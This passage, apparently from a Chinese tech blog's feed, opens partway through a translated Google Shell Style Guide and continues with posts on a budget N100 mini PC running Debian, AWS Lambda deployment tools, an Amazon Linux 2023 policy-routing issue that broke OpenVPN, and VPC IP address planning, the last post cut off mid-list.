多个管道(Pipelines)如果一行不能容纳多个管道操作，那么请将多个管道拆分成一行一个。
如果一行容得下整个管道操作，那么请将整个管道操作写在同一行。否则，那么应该分割成每行一个管道，新的一行应该缩进 ２ 个空格。这条规则适用于那些通过使用”|”或者是一个逻辑运算符”||”和”&amp;&amp;”等组合起来的链式命令。
# All fits on one linecommand1 | command2# Long commandscommand1 \  | command2 \  | command3 \  | command4
循环(Loops)请将 ; do、; then 和 while、for 或者 if 放在同一行。
Shell 中的循环略有不同，但是我们遵循像声明函数时用大括号同样的原则，也就是说：; do、; then 应该和 if/for/while 放在同一行。 else 应该单独一行，结束语句应该单独一行并且跟开始语句垂直对齐。
例如：
for dir in $&#123;dirs_to_cleanup&#125;; do  if [[ -d "$&#123;dir&#125;/$&#123;ORACLE_SID&#125;" ]]; then    log_date "Cleaning up old files in $&#123;dir&#125;/$&#123;ORACLE_SID&#125;"    rm "$&#123;dir&#125;/$&#123;ORACLE_SID&#125;/"*    if [[ "$?" -ne 0 ]]; then      error_message    fi  else    mkdir -p "$&#123;dir&#125;/$&#123;ORACLE_SID&#125;"    if [[ "$?" -ne 0 ]]; then      error_message    fi  fidone
Case 语句(Case statement)
缩进可用 2 个空格替代。
可用一行替代的，需要在右括号后面和 ;; 号前面添加一个空格。
对于长的，有多个命令的，应该分割成多行，其中匹配项，对于匹配项的处理以及 ;; 号各自在单独的行。

case 和 esac 中匹配项的表达式应该都在同一个缩进级别，匹配项的（多行）处理也应该在另一个缩进级别。通常来说，没有必要给匹配项的表达式添加引号。匹配项的表达式不应该在前面加一个左括号，避免使用 ;&amp; 和 ;;s&amp; 等符号.
case "$&#123;expression&#125;" in  a)    variable="..."    some_command "$&#123;variable&#125;" "$&#123;other_expr&#125;" ...    ;;  absolute)    actions="relative"    another_command "$&#123;actions&#125;" "$&#123;other_expr&#125;" ...    ;;  *)    error "Unexpected expression '$&#123;expression&#125;'"    ;;esac
对于一些简单的匹配项处理操作，可以和匹配项表达式以及 ;; 号在同一行,只要表达式仍然可读。这通常适合单字符的选项处理，当匹配项处理操作不能满足单行的情况下，可以将匹配项表达式单独放在一行，匹配项处理操作和 ;; 放在同一行，当匹配项操作和匹配项表达式以及 ;; 放在同一行的时候在匹配项表达式右括号后面以及 ;; 前面放置一个空格。
verbose='false'aflag=''bflag=''files=''while getopts 'abf:v' flag; do  case "$&#123;flag&#125;" in    a) aflag='true' ;;    b) bflag='true' ;;    f) files="$&#123;OPTARG&#125;" ;;    v) verbose='true' ;;    *) error "Unexpected option $&#123;flag&#125;" ;;  esacdon
变量扩展(Variable expansion)按优先级顺序：保持跟你所发现的一致；把你的变量用括号印起来；推荐用 &quot;${var}&quot; 而不是 &quot;$var&quot;，详细解释如下。
这些仅仅是指南，因为按标题作为强制的规定饱受争议。以下按照优先顺序列出。

与现存代码中你所发现的保持一致。
把变量用（大）扩号引起来，参阅下面一节：引用。
除非绝对必要或者为了避免深深的困惑，否则不要用大括号将单个字符的 Shell 特殊变量或位置参数括起来。推荐将其他所有变量用大括号括起来。

# Section of recommended cases.# Preferred style for 'special' variables:echo "Positional: $1" "$5" "$3"echo "Specials: !=$!, -=$-, _=$_. ?=$?, #=$# *=$* @=$@ \$=$$ ..."# Braces necessary:echo "many parameters: $&#123;10&#125;"# Braces avoiding confusion:# Output is "a0b0c0"set -- a b cecho "$&#123;1&#125;0$&#123;2&#125;0$&#123;3&#125;0"# Preferred style for other variables:echo "PATH=$&#123;PATH&#125;, PWD=$&#123;PWD&#125;, mine=$&#123;some_var&#125;"while read f; do  echo "file=$&#123;f&#125;"done &lt; &lt;(ls -l /tmp)# Section of discouraged cases# Unquoted vars, unbraced vars, brace-quoted single letter# shell specials.echo a=$avar "b=$bvar" "PID=$&#123;$&#125;" "$&#123;1&#125;"# Confusing use: this is expanded as "$&#123;1&#125;0$&#123;2&#125;0$&#123;3&#125;0",# not "$&#123;10&#125;$&#123;20&#125;$&#123;30&#125;set -- a b cecho "$10$20$30"
引用(Quoting)
除非需要小心不带引用的扩展，否则总是将包含变量、命令替换符、空格或 Shell 元字符的字符串引起来。
优先引用是单词的字符串（而不是命令选项或者路径名）。
不要对整数进行引用。
千万小心 [[ 中模式匹配的引用规则。
请使用 $@ 除非你有特殊原因需要使用 $*。

# 'Single' quotes indicate that no substitution is desired.# "Double" quotes indicate that substitution is required/tolerated.# Simple examples# "quote command substitutions"flag="$(some_command and its args "$@" 'quoted separately')"# "quote variables"echo "$&#123;flag&#125;"# "never quote literal integers"value=32# "quote command substitutions", even when you expect integersnumber="$(generate_number)"# "prefer quoting words", not compulsoryreadonly USE_INTEGER='true'# "quote shell meta characters"echo 'Hello stranger, and well met. Earn lots of $$$'echo "Process $$: Done making \$\$\$."# "command options or path names"# ($1 is assumed to contain a value here)grep -li Hugo /dev/null "$1"# Less simple examples# "quote variables, unless proven false": ccs might be emptygit send-email --to "$&#123;reviewers&#125;" $&#123;ccs:+"--cc" "$&#123;ccs&#125;"&#125;# Positional parameter precautions: $1 might be unset# Single quotes leave regex as-is.grep -cP '([Ss]pecial|\|?characters*)$' $&#123;1:+"$1"&#125;# For passing on arguments,# "$@" is right almost everytime, and# $* is wrong almost everytime:## * $* and $@ will split on spaces, clobbering up arguments#   that contain spaces and dropping empty strings;# * "$@" will retain arguments as-is, so no args#   provided will result in no args being passed on;#   This is in most cases what you want to use for passing#   on arguments.# * "$*" expands to one argument, with all args joined#   by (usually) spaces,#   so no args provided will result in one empty string#   being passed on.# (Consult 'man bash' for the nit-grits ;-)set -- 1 "2 two" "3 three tres"; echo $# ; set -- "$*"; echo "$#, $@")set -- 1 "2 two" "3 three tres"; echo $# ; set -- "$@"; echo "$#, $@")
特征和错误(Features and Bugs)命令替换(Command Substitution)使用 $(command) 而不是反引号。
嵌套的反引号要求用反斜杠(&quot;\&quot;)转义内部的反引号。而 $(command) 形式嵌套时不需要改变，而且更易于阅读。例如：
# This is preferred:var="$(command "$(command1)")"# This is not:var="`command \`command1\``"
Test, [ 和 [[(Test, [ and [[)优先使用 [[ ... ]]，而不是 [, test 和 /usr/bin/[。
因为在 [[ 和 ]] 之间不会有路径名称扩展或单词分割发生，所以使用 [[ ... ]] 能够减少错误。而且 [[ ... ]] 允许正则表达式匹配，而 [ ... ] 不允许。
# This ensures the string on the left is made up of characters in the# alnum character class followed by the string name.# Note that the RHS should not be quoted here.# For the gory details, see# E14 at http://tiswww.case.edu/php/chet/bash/FAQif [[ "filename" =~ ^[[:alnum:]]+name ]]; then  echo "Match"fi# This matches the exact pattern "f*" (Does not match in this case)if [[ "filename" == "f*" ]]; then  echo "Match"fi# This gives a "too many arguments" error as f* is expanded to the# contents of the current directoryif [ "filename" == f* ]; then  echo "Match"fi
测试字符串(Testing Strings)尽可能使用引用，而不是过滤字符串。Bash 足以在测试中处理空字符串。所以，请使用空（非空）字符串测试，而不是过滤字符，使得代码更易于阅读。
# Do this:if [[ "$&#123;my_var&#125;" = "some_string" ]]; then  do_somethingfi# -z (string length is zero) and -n (string length is not zero) are# preferred over testing for an empty stringif [[ -z "$&#123;my_var&#125;" ]]; then  do_somethingfi# This is OK (ensure quotes on the empty side), but not preferred:if [[ "$&#123;my_var&#125;" = "" ]]; then  do_somethingfi# Not this:if [[ "$&#123;my_var&#125;X" = "some_stringX" ]]; then  do_somethingfi
为了避免对你测试的目的产生困惑，请明确使用 -z 或者 -n
# Use thisif [[ -n "$&#123;my_var&#125;" ]]; then  do_somethingfi# Instead of this as errors can occur if $&#123;my_var&#125; expands to a test# flagif [[ "$&#123;my_var&#125;" ]]; then  do_somethingfi
文件名的通配符扩展(Wildcard Expansion of Filenames)当做文件名通配符扩展的时候，使用显式路径。
因为文件名可以使用 - 开头，所以使用扩展通配符 ./* 比 * 安全得多。
# Here's the contents of the directory:# 当前目录下又-f -r somedir somefile等文件和目录# -f  -r  somedir  somefile# 使用rm -v *将会扩展成rm -v -r -f somedir simefile，这将导致删除当前目录所有的文件和目录# This deletes almost everything in the directory by forcepsa@bilby$ rm -v *removed directory: `somedir'removed `somefile'#相反如果你使用./*则不会，因为-r -f就不会变成rm的参数了# As opposed to:psa@bilby$ rm -v ./*removed `./-f'removed `./-r'rm: cannot remove `./somedir': Is a directoryremoved `./somefile'
Evaleval 命令应该被禁止执行。
eval 用于给变量赋值的时候，可以设置变量，但是不能检查这些变量是什么。
# What does this set?# Did it succeed? In part or whole?eval $(set_my_variables)# What happens if one of the returned values has a space in it?variable="$(eval some_function)"
管道导向 while 循环(Pipes to While)优先使用过程替换或者 for 循环，而不是管道导向 while 循环。在 while 循环中被修改的变量是不能传递给父 Shell 的，因为循环命令是在一个子 Shell 中运行的。
管道导向 while 循环中的隐式子 Shell 使得追踪 bug 变得很困难。
last_line='NULL'your_command | while read line; do  last_line="$&#123;line&#125;"done# This will output 'NULL'echo "$&#123;last_line&#125;"
如果你确定输入中不包含空格或者特殊符号（通常意味着不是用户输入的），那么可以使用一个 for 循环。
total=0# Only do this if there are no spaces in return values.for value in $(command); do  total+="$&#123;value&#125;"done
使用过程替换允许重定向输出，但是请将命令放入一个显式的子 Shell 中，而不是 bash 为 while 循环创建的隐式子 Shell。
total=0last_file=while read count filename; do  total+="$&#123;count&#125;"  last_file="$&#123;filename&#125;"done &lt; &lt;(your_command | uniq -c)# This will output the second field of the last line of output from# the command.echo "Total = $&#123;total&#125;"echo "Last one = $&#123;last_file&#125;"
当不需要传递复杂的结果给父 Shell 时可以使用 while 循环。这通常需要一些更复杂的“解析”。请注意简单的例子使用如 awk 这类工具可能更容易完成。当你特别不希望改变父 Shell 的范围变量时这可能也是有用的。
# Trivial implementation of awk expression:#   awk '$3 == "nfs" &#123; print $2 " maps to " $1 &#125;' /proc/mountscat /proc/mounts | while read src dest type opts rest; do  if [[ $&#123;type&#125; == "nfs" ]]; then    echo "NFS $&#123;dest&#125; maps to $&#123;src&#125;"  fidone
命名约定(Naming Conventions)函数名(Function Names)使用小写字母，并用下划线分隔单词。使用双冒号 :: 分隔库。函数名之后必须有圆括号。关键词 function 是可选的，但必须在一个项目中保持一致。
如果你正在写单个函数，请用小写字母来命名，并用下划线分隔单词。如果你正在写一个包，使用双冒号 :: 来分隔包名。大括号必须和函数名位于同一行（就像在 Google 的其他语言一样），并且函数名和圆括号之间没有空格。
# Single functionmy_func() &#123;  ...&#125;# Part of a packagemypackage::my_func() &#123;  ...&#125;
当函数名后存在 () 时，关键词 function 是多余的。但是其促进了函数的快速辨识。
变量名(Variable Names)如函数名。
循环的变量名应该和要循环的任何变量同样命名。
for zone in $&#123;zones&#125;; do  something_with "$&#123;zone&#125;"done
常量和环境变量名(Constants and Environment Variable Names)要大写、用下划线分割、声明在文件的开头。
常量和任何导出到环境的变量都应该大写。
# Constantreadonly PATH_TO_FILES='/some/path'# Both constant and environment# declare -r设置只读变量，-x设置为环境变量declare -xr ORACLE_SID='PROD'
有些第一次设置时(例如使用 getopts 情况下)就变成了常量。也就是说，可以在 getopts 中或基于条件来设定常量，但之后应该立即设置其为只读。需要注意的是，declare 不能在函数内部操作全局变量，所以这时推荐使用 readonly 和 export 来代替。
VERBOSE='false'while getopts 'v' flag; do  case "$&#123;flag&#125;" in    v) VERBOSE='true' ;;  esacdonereadonly VERBOSE
源文件名(Source Filenames)小写，如果需要的话使用下划线分隔单词。
这是为了和在 Google 中的其他代码风格保持一致：maketemplate 或者 make_template，而不是 make-template。
只读变量(Read-ony Variables)使用 readonly 或者 declare -r 来确保变量只读。
因为全局变量在 Shell 中广泛使用，所以在使用它们的过程中捕获错误是很重要的。当你声明了一个希望其只读的变量，那么请明确指出。
zip_version="$(dpkg --status zip | grep Version: | cut -d ' ' -f 2)"if [[ -z "$&#123;zip_version&#125;" ]]; then  error_messageelse  readonly zip_versionfi
使用本地变量(Use Local Variables)使用 local 声明函数内部变量。声明和赋值应该在不同行。
使用 local 来声明局部变量以确保其只在函数内部和子函数中可见。这避免了污染全局命名空间和不经意间设置可能具有函数之外重要意义的变量。
当赋值的值由命令替换提供时，声明和赋值必须分开。因为内建的 local 不会从命令替换中传递退出码。
my_func2() &#123;  local name="$1"  # Separate lines for declaration and assignment:  local my_var  my_var="$(my_func)" || return  # DO NOT do this: $? contains the exit code of 'local', not my_func  local my_var="$(my_func)"  [[ $? -eq 0 ]] || return  ...&#125;
函数位置(Function Location)将文件中所有的函数一起放在常量下面。不要在函数之间隐藏可执行代码。
如果你有函数，请将他们一起放在文件头部。只有 includes，set 语句和设置常数可能在函数定义前完成。不要在函数之间隐藏可执行代码。如果那样做，会使得代码在调试时难以跟踪并出现意想不到的讨厌结果。
主函数(main)对于足够长的脚本来说，至少需要一个名为 main 的函数来调用其它的函数。
为了便于找到程序的起始位置，把主程序放在一个叫 main 的函数中，放在其它函数的下面，为了提供一致性你应该定义更多的变量为本地变量(如果主程序不是一个程序，那么不能这么做)，文件中最后一句非注释行应该是一个 main 函数的调用。
main "$@"
调用命令(Calling Commands)检查返回值(Checking Return Values)总是应该检查返回值，给出返回值相关的信息。
对于一个未使用管道的命令，可以使用 $? 或者直接指向 if 语句来检查其返回值例子:
if ! mv "$&#123;file_list&#125;" "$&#123;dest_dir&#125;/" ; then  echo "Unable to move $&#123;file_list&#125; to $&#123;dest_dir&#125;" &gt;&amp;2  exit "$&#123;E_BAD_MOVE&#125;"fi# Ormv "$&#123;file_list&#125;" "$&#123;dest_dir&#125;/"if [[ "$?" -ne 0 ]]; then  echo "Unable to move $&#123;file_list&#125; to $&#123;dest_dir&#125;" &gt;&amp;2  exit "$&#123;E_BAD_MOVE&#125;"fi
Bash 同样有 PIPESTATUE 变量允许检查管道命令所有部分的返回码，这仅仅用于检查整个管道执行成功与否。下面的例子是被接受的。
tar -cf - ./* | ( cd "$&#123;dir&#125;" &amp;&amp; tar -xf - )if [[ "$&#123;PIPESTATUS[0]&#125;" -ne 0 || "$&#123;PIPESTATUS[1]&#125;" -ne 0 ]]; then  echo "Unable to tar files to $&#123;dir&#125;" &gt;&amp;2fi
然后当你使用任何其它命令的时候 PIPESTATUS 将会被覆盖，如果你需要根据管道发生错误的地方来进行不同的操作，那么你将需要在运行完管道命令后立即将  PIPESTATUS 的值赋给另外一个变量(不要忘了[这个符号也是一个命令，将会把PIPESTATUS 的值给覆盖掉．)
tar -cf - ./* | ( cd "$&#123;DIR&#125;" &amp;&amp; tar -xf - )return_codes=($&#123;PIPESTATUS[*]&#125;)if [[ "$&#123;return_codes[0]&#125;" -ne 0 ]]; then  do_somethingfiif [[ "$&#123;return_codes[1]&#125;" -ne 0 ]]; then  do_something_elsefi
内置命令对比外部命令(Builtin Commands vs. External Commands)可以在调用 Shell 内建命令和调用另外的程序之间选择，请选择内建命令。
我们更喜欢使用内建命令，如在 bash(1) 中参数扩展函数。因为它更强健和便携（尤其是跟像 sed 这样的命令比较）
例如：
# Prefer this:addition=$(($&#123;X&#125; + $&#123;Y&#125;))substitution="$&#123;string/#foo/bar&#125;"# Instead of this:addition="$(expr $&#123;X&#125; + $&#123;Y&#125;)"substitution="$(echo "$&#123;string&#125;" | sed -e 's/^foo/bar/')"
结论(Conclusion)使用常识并（跟已有的）保持一致。
请使用几分钟来阅读 C++(风格)指南下部的 Parting Words 章节。
引用
原文来自于 Google 的 Shell Style Guide
参照 Shell 风格指南
参照 Google Style Guides-Shell Style Guide

[^1]: 这里我有保留意见，我问个简单问题吧：10 年前写的同是 100+ 行的 python 代码和一段 bash 代码，哪一个能在现在的系统下正常跑的可能性更大呢？如果说 10 年前没有 python 的话那我换下问题：今天写同样 100+ 行的  python 代码和 bash 代码，10 年后谁还能正确运行的概率高呢？
]]></content>
      <tags>
        <tag>Google</tag>
        <tag>Shell</tag>
        <tag>Bash</tag>
        <tag>programe</tag>
        <tag>code</tag>
        <tag>Style</tag>
        <tag>Guide</tag>
      </tags>
  </entry>
  <entry>
    <title>800 块钱的办公电脑</title>
    <url>/2024/05/800%20%E5%9D%97%E9%92%B1%E7%9A%84%E5%8A%9E%E5%85%AC%E7%94%B5%E8%84%91/index.html</url>
    <content><![CDATA[我用 800 块钱买了台办公用的 Mini PC最近，我花了 800 块钱买了一台 Mini PC，用来办公。刚好这四个月在公司领到的每月 200 块钱电脑补贴，全都花光了。算是“取之于公司，用之于公司”吧，哈哈。
这次的购买经历不仅让我更深刻地体会到“消费降级”的现实，还让我感受到了科技进步所带来的性价比红利。在预算有限的情况下，这台 Mini PC 不仅完美满足了我的日常需求，还让我对它的未来用途充满期待。接下来，我详细聊聊这次购买的选择过程、使用体验以及相关感悟。


配置与硬件概览这台 Mini PC 的硬件配置如下：

CPU: Intel 第 12 代 N100
4 核心
缺省运行在 0.8 GHz 的低功耗模式，但睿频最高可达 3.4 GHz


内存: DDR4，主频未知
存储: M.2 2280 PCIe SSD，容量 512 GB
网络: 双频 WiFi（2.4G+5G）+ 蓝牙
其他物理接口:
USB3.2 × 2
USB2.0 × 2
耳机接口 × 1
千兆以太网卡 × 1
HDMI × 1
DP（DisplayPort） × 1



此外，它的体积和重量也非常小巧：

尺寸：124.5 x 112 x 50.8 mm
重量：约 400 克

整机可以轻松放在桌面的一角，或者显示器下面的空隙。
系统选择与使用体验拿到手后，我给这台 Mini PC 装了 Debian testing 系统，当前版本是 Debian 13，字母代号 trixie，桌面环境选择了轻量的 XFCE。安装过程非常顺利，硬件驱动几乎开箱即用，尤其是 WiFi 和蓝牙的兼容性让我非常满意。
但是装完以后进入桌面发现 wifi 用不了。可能是安装时没选相关 non-free 的包的问题吧。但是经过简单的排错、下载了一个 https://git.kernel.org/pub/scm/linux/kernel/git/firmware/linux-firmware.git/tree/iwlwifi-so-a0-jf-b0-77.ucode 放到 &#x2F;usr&#x2F;lib&#x2F;firmware&#x2F; 目录下以后就好了。
下面是一张我使用 neofetch 工具查看系统和硬件信息的截图：

从图中可以清晰看到系统的核心信息：

系统: Debian GNU&#x2F;Linux trixie&#x2F;sid x86_64
内核: 6.11.7-amd64
运行时间: 已开机 7 天 19 小时
CPU: Intel N100 (4 核 @ 3.4 GHz)
GPU: Intel Alder Lake-N UHD Graphics
内存使用: 11.88 GB &#x2F; 15.70 GB

选择 Mini PC 的理由Mac Mini M2 的诱惑有趣的是，这次购买正好碰上了 Mac Mini M4 发售。因为各种折扣补贴，当时这台设备的价格非常美好，只要 3000 出头。有同事也推荐我直接买 Mac Mini，毕竟性能和生态都很优秀，而且这好像还是第一次改了模具，整个机型变得比上一版小巧了很多很多。
我确实犹豫了一下，但仔细思考后，还是选择了这台便宜了两千多块的 Mini PC。原因很简单：

预算有限：800 元 vs 3000 元，差价不是一星半点。即使 Mac Mini 性能更好，但对我来说这些性能是溢出的，完全用不到。
实际需求：我的工作主要依赖 SSH 和 浏览器，对性能的要求并不高。而这台 Mini PC 在省钱的同时，已经能很好地满足这些需求。
可玩性更高：用 Debian 和 XFCE 环境，比起 macOS，更符合我的习惯，也更自由可控。

好吧，我摊牌了，其实原因就是第一个，其他两个都是搭头。
所以，尽管 Mac Mini M4 也是性价比很高的设备，但对比我的实际需求，这台 800 元的 Mini PC 显然是更务实的选择。
办公和远程工作的便利性目前，这台 Mini PC 是我主要的办公设备，而且我设置了它每天不关机，一直保持在线状态。在家时，如果需要处理工作，只要通过远程工具直接登录它，就可以快速进入工作状态，非常方便。
同时，得益于低功耗特性，而且的确负载也轻，它 24 小时开机几乎感觉不到风扇的噪音。这样的小型设备，不仅可以满足日常办公需求，还能成为远程协作的可靠节点。
低功耗与未来的潜力这台 Mini PC 的另一个显著优势是功耗极低。Intel N100 平台在缺省状态下只跑 0.8 GHz，风扇几乎听不到声音。即使长时间开机运行，耗电和发热都非常可控。偶尔需要睿频到 3.4 GHz 时，性能释放也完全够用。
得益于低功耗、小尺寸的特点，这台电脑即使以后不再用作办公机，也有很多未来用途。我已经有以下几个计划：

NAS：搭建一个家庭文件存储和同步服务，继续配合 Syncthing 使用。
Docker 容器：托管一些轻量级的服务，比如媒体服务器、工具脚本等。
远程访问节点：利用 ZeroTier 和 Tailscale，随时随地访问家中设备。

对比起高功耗的传统台式机，这样的小型设备更适合用作家庭服务器，长期运行也不用担心电费问题。
关于消费降级的感慨老实说，我选择这台 Mini PC，主要还是因为个人经济状况的限制。最近手头确实有点紧，所以只能选择性价比最高的方案。以前可能会考虑更高端的设备，比如 Mac Mini，但现在不得不降低预算，选择更务实的解决方案。
不过，虽然是消费降级，但我并没有感到体验上的妥协。反而在科技发展的红利下，我用 800 块就买到了一台能够胜任办公、还能支持未来扩展的 Mini PC。放在几年前，这样的设备简直是想都不敢想。
总的来说，这次的购买让我非常满意。当然，为了避免“带货”嫌疑，就不提具体品牌和型号以及购买的平台了。不过，如果你也在寻找一台高性价比的办公电脑，这种 Mini PC 确实值得考虑。
]]></content>
      <tags>
        <tag>minipc</tag>
        <tag>Debian</tag>
        <tag>trixie</tag>
        <tag>xfce</tag>
        <tag>N100</tag>
        <tag>Intel</tag>
        <tag>iwlwifi-so-a0-jf-b0-77.ucode</tag>
      </tags>
  </entry>
  <entry>
    <title>AWS 官方的部署 Python 代码到 Lambda function 上去的两种方法</title>
    <url>/2024/03/AWS%20%E5%AE%98%E6%96%B9%E7%9A%84%E9%83%A8%E7%BD%B2%20Python%20%E4%BB%A3%E7%A0%81%E5%88%B0%20Lambda%20function%20%E4%B8%8A%E5%8E%BB%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E6%B3%95/index.html</url>
    <content><![CDATA[简介要把 Python 项目部署到 AWS 的 Lambda function，AWS 官方提供了两种方法：Chalice 和 SAM(AWS Serverless Application Model)，当然，其实比较常用的还有第三方的 serverless。


详情ChaliceChalice 不仅仅是一个部署工具，它还是一个框架，要是用它需要在 Python 代码里 import 它的包，并在代码里需要的地方使用它的方法做一些操作。
这样才能在用命令 chalice deploy 部署时结合其他配置文件(.chalice/config.json 以及其他需要的 .chalice/policy-xxx.json) 完成部署。
Chalice 其实应该是调用的 AWS SDK for Python 来实现的，因此它也需要先在本地配置 AWS 的 credentials。
SAMSAM，全称：AWS Serverless Application Model，由名字一看就知道是一个通用的工具，可以用来部署各种语言（比如 Python、Java 和 nodejs）编写的 serverless 应用。
SAM 则是完全基于 AWS CLI，所以本地需要先安装并配置好 AWS CLI 的环境，让 AWS CLI 能跑起来。
SAM 的工作原理其实最终是通过在 AWS 上的 cloudformation 里创建 stack 来完成部署的。所以，cloudformation 有的缺点他都有。
区别
Chalice 仅适用于 Python 语言，而且对代码的侵入性比较强。但优点是完全使用 AWS SDK，不依赖于 AWS CLI 和 cloudformation(尤其是后者，比较不好用)
SAM 更加通用，不侵入代码，但缺点是依赖于 AWS CLI 和 cloudformation（主要是后者）

总结
如果是新起的项目，并打算用 Python 开发的，可以考虑选 Chalice
如果不是用 Python 开发的，肯定不能用 Chalice，大概率选 SAM
如果是已有的项目，现在要部署到 AWS 的 Lambda function，也最好选 SAM


本文由 老杨 原创，转载请注明出处。
]]></content>
      <tags>
        <tag>AWS</tag>
        <tag>Chalice</tag>
        <tag>SAM</tag>
        <tag>Python</tag>
        <tag>Lambda</tag>
      </tags>
  </entry>
  <entry>
    <title>Amazon Linux 2023：Bug 还是特性？</title>
    <url>/2023/05/Amazon%20Linux%202023%EF%BC%9ABug%20%E8%BF%98%E6%98%AF%E7%89%B9%E6%80%A7%EF%BC%9F/index.html</url>
    <content><![CDATA[背景在 AWS 的一个 VPC 内部的一台 EC2 上搭了一个 OpenVPN 服务器，对，就是 从 Client VPN endpoint 迁移到 EC2 上的 OpenVPN 提到的这件事。然后我有台 PC 通过 OpenVPN 客户端软件连了过来。以下是基本信息。

NOTE: IP 地址都不是实际真实情况


EC2（A）
公网 IP：1.1.1.1（本地并没有，这个是防火墙或其他设备给做的一对一 map）
私网 IP：10.0.0.2/24
私网网关：10.0.0.1
私网网卡：enX0
tun 设备名：tun0
tun 设备 IP：172.16.0.1/24


PC（B）
tun 设备名：tun0
tun 设备 IP：172.16.0.2/24





问题描述问题的核心是：B 无法 ping 通 A 的私网 IP。换句话说，当我在 B 上执行 ping 10.0.0.2 命令时，无法得到响应。俗话就是 ping 不通 10.0.0.2。
问题排查初步排查我对 AWS EC2 的网络问题进行了深入的排查，包括各种路由表、安全组、网络 ACL，甚至本地的防火墙配置等等。然而，我并没有找到问题的所在。我可以访问 VPC 内部的私网里的 RDS 资源，也可以在 A 上明显看到有接收到数据包。
ICMP 包的追踪我继续深入，发现在 A 上可以接收到 B 发送的 icmp 包，而且 A 也确实有回包，但是奇怪的是，回包并没有通过 tun0 设备，而是直接从 enX0 设备发送出去！
不是路由的问题（？）马上怀疑本地路由有问题，直接在 A 上执行
ip r get 172.16.0.2

发现没问题呀，是从设备 tun0 走的呀？这下就完全把我给整不会了。再此之后，我还做了好些努力，比如：
继续检测排查
在 A 上 ping B 的 VPN 地址（tun0 设备上）：
ping 172.16.0.2，当然是通的
ping -I 10.0.0.2 172.16.0.2，这种指定源 IP 的方式 ping，当然是不通的，同样问题，听包发现包没往 tun0 设备上走，而是往 enX0 上走了


跟各种 AI 掰扯，也被告知过 n 多需要检查的地方，比如 kernel 参数 rp_filter 啥的，都对，但都没啥意义，都查过 n 多遍了。
还在微信朋友圈里发了这个问题，看看朋友圈的卧龙凤雏有没有啥好一点的建议方法。回复基本上都有道理，但没有一个能给我灵感的。

问题原因多番努力，虽然没有结果，但是慢慢还是明白了问题所在就是为什么从 10.0.0.2 出去按路由表应该往 tun0 上走的包却走到了 enX0 上？“这还是路由的问题“，我盖棺定论。
老想想不出为什么，于是就上网找了找 Linux 高级路由的资料看了看，突然想起来：Linux 系统里，路由选择上比路由表级别更高的还有一个：路由策略！柳暗花明呀。
我立马起来，登录上 EC2，
ip rule s

果然有一条记录：

10000:  from 10.0.0.2 lookup 10000 proto static

果然有货，再接着看这条 id 是 10000 的路由表里有什么：
ip r s table 10000

系统显示：

default via 10.0.0.1 dev enX0 proto dhcp metric 51210.0.0.0&#x2F;24 dev enX0 proto static scope link

这一下子逻辑就清晰了，源地址是 10.0.0.2、目标地址是 172.16.0.2 的数据包之所以会往 enX0 上走是因为路由策略 10000:  from 10.0.0.2 lookup 10000 proto static，这个策略规定了源地址是 10.0.0.2 的数据包怎么走要看路由表 10000，而在 10000 这张路由表又是这样的：

default via 10.0.0.1 dev enX0 proto dhcp metric 51210.0.0.0&#x2F;24 dev enX0 proto static scope link

按照这个路由表，去往 172.16.0.2 的数据包不妥妥的要往 enX0 上发吗？
问题验证最后，我还要做最后一个测试，以验证我的结论：
sudo ip r add 172.16.0.0/24 \    dev tun0 \    src 172.16.0.1 \    table 10000

然后，那边在 B 上 ping 10.0.0.2 马上就通了。
最后的最后，我把刚加的这条路由删掉了，因为我还没想好要不要修以及怎么修这个问题。
sudo ip r del 172.16.0.0/24 table 10000

结论由于 Amazon Linux 2023 中在策略路由里将从 EC2 私网地址为源地址的数据包强制走了另外一张路由表，在那张表里源地址为 EC2 私网地址的数据包会走 enX0，而我的 OpenVPN 服务启动时只修改了缺省的路由表：main，故而导致从 OpenVPN 的客户端不能通 EC2 的私网地址。
所以，这到底是 Amazon Linux 2023 的 bug 呢，还是 OpenVPN 的 bug 呢？这个问题还需要进一步的探讨和研究。
]]></content>
      <tags>
        <tag>ip</tag>
        <tag>OpenVPN</tag>
        <tag>AWS</tag>
        <tag>AL2023</tag>
        <tag>Amazon Linux 2023</tag>
        <tag>EC2</tag>
        <tag>策略路由</tag>
        <tag>ping</tag>
        <tag>路由表</tag>
        <tag>rp_filter</tag>
      </tags>
  </entry>
  <entry>
    <title>Best Practices for VPC IP Address Allocation</title>
    <url>/2022/09/Best%20Practices%20for%20VPC%20IP%20Address%20Allocation/index.html</url>
    <content><![CDATA[缘起如今公有云用的越来越多，各个区域、不同可用区，还有各种特殊服务，再加上也许还有自建 IDC，还有办公网内网。我的传统是会将这些内网打通的。所以，各个节点网络的 IP 地址分配策略（方案）就成了一个绕不开的话题。


背景介绍
region: 公有云厂商每个 region（我喜欢叫做节点）里可以创建多个 VPC
zone: 每个 region 会有三个或更多的可用区（zone），每个可用区可以看作是一个数据中心（IDC）
subnet: subnet(子网) 会在某个可用区（zone）里创建。

VPC 分配策略我常用的一些 VPC 创建管理策略：

生产(Product)、测试(testing)和 Stage 环境（如果有的话）一般会单独一个 VPC
infrastracture 的相关机器（比如 Gitlab、VPN server、日志处理和监控报警等）也会一个单独的 VPC（规模相对较小）

VPC 下 subnet 的策略
公有云厂商一般会建议每个 VPC 至少要跨两个可用区（为了冗余，避免某个可用区挂掉导致所有服务不可用），我一般会跨三个可用区。
公有云厂商会建议 VPC 下的子网（subnet）分成公网子网（配公网 IP）和私网子网（不配公网 IP）。

VPC 中的 IP 分配私网地址这里指的是在 RFC 1918 里定义的“私有地址空间（Private Address Space）”，各大公有云厂商允许分配给 VPC 的 IP 地址只能是这其中的。

10.0.0.0&#x2F;8（从 10.0.0.0 到 10.255.255.255）
172.16.0.0&#x2F;12（从 172.16.0.0 到 172.31.255.255）
192.168.0.0&#x2F;16（从 192.168.0.0 到 192.168.255.255）

VPC 和 subnet 的 IP 分配要求
每个 VPC 要分一段（上面提到的）私网地址
VPC 下的每个 subnet 也要独占一段其 VPC 占有的私网地址中的一段

IP 分配策略VPC
根据 VPC 的数量多少选用 10 段、172 段还是 192 段的 IP
每个 VPC 根据需求大小选一个或多个 C 段地址，当然更小也是可以的，比如半个 C 段（比如有些 infrastructure）。

subnet以最简单的 VPC 配置四个 C 段地址为例（我常用是一个 VPC 两个 C 段），假设其是 10.0.0.0&#x2F;22（也就是 10.0.0.0&#x2F;24、10.0.1.0&#x2F;24、10.0.2.0&#x2F;24 和 10.0.3.0&#x2F;24 四个 C 段），那么：
找三个可用区，

分别建立一个私网子网，分配 IP 地址段：
